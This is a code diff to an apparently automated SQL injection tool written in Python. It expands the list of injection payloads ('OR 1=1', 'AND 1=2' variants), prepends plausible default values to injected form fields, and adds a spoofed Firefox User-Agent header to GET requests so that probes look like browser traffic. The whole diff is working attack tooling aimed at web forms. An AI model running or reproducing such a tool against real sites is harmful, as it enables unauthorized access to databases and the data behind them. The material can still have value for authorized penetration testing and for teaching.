@@ -6,7 +6,7 @@ import requests
 from src.sql_injection_builder import SQLInjectionBuilder
 
 class SQLInjectorState(ABC):
-    injections_to_try = ("' OR 1=1", " OR 1=1", "' OR 1=\"1\"", " OR 1=\"1\"")
+    injections_to_try = (" AND 1=\"2\"", " AND 1=2", "' OR 1=1", " OR 1=1", "' OR 1=\"1\"", " OR 1=\"1\"")
 
     def __init__(self, sql_injector) -> None:
         self.sql_injector = sql_injector
@@ -25,11 +25,16 @@ class SQLInjectorState(ABC):
                           "text": "random text",
                           "password": "456QWdsa!gios",
                           "email": "valid@gmail.com",
-                          "number": 5}
+                          "number": 1}
 
         if input_chosen.type == "submit":
             return
-        data = {input_chosen.name: sql_injection_string}
+        data = {}
+        default_value_chosen = default_values.get(input_chosen.type, None)
+        if default_value_chosen == None:
+            data[input_chosen.name] = sql_injection_string
+        else:
+            data[input_chosen.name] = str(default_value_chosen) + sql_injection_string
         for input_ in inputs:
             if input_ == input_chosen or input_.type == "submit":
                 continue
@@ -48,9 +53,11 @@ class SQLInjectorState(ABC):
     def http_request_inject(self, method, url, data=None):
         if method == "get":
             if data is None:
-                response = requests.get(url)
+                response = requests.get(url, headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0', })
             else:
-                response = requests.get(f"{url}?{urllib.parse.urlencode(data)}")
+                response = requests.get(f"{url}?{urllib.parse.urlencode(data)}", headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0', })
         elif method == "post":
             response = requests.post(url, data=data)
         return response
